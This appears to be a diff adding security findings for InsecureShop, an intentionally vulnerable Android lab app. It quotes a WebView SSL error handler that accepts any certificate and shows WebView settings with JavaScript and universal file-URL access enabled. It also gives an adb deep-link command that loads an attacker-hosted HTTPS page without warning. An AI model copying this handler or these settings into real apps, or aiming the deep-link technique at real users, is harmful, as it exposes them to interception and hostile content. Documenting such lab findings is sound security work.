@@ -1,0 +1,13 @@
+# InsecureShop WebView security findings (decompiled)
+## CustomWebViewClient — ignores ALL SSL errors (MITM):
+public void onReceivedSslError(WebView v, SslErrorHandler handler, SslError e) {
+    if (handler != null) handler.proceed();     // proceeds on any invalid cert
+}
+## WebView settings (WebViewActivity / WebView2Activity / PrivateActivity):
+setJavaScriptEnabled(true)
+setAllowUniversalAccessFromFileURLs(true)
+## addJavascriptInterface / @JavascriptInterface : NONE (no native JS bridge)
+## Demonstration:
+# self-signed HTTPS on host: python https_server.py (8443), cert = self-signed CN=10.0.2.2
+adb shell am start -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=https://10.0.2.2:8443/attacker.html"
+# result: attacker HTTPS page rendered WITHOUT any SSL warning (screenshot)
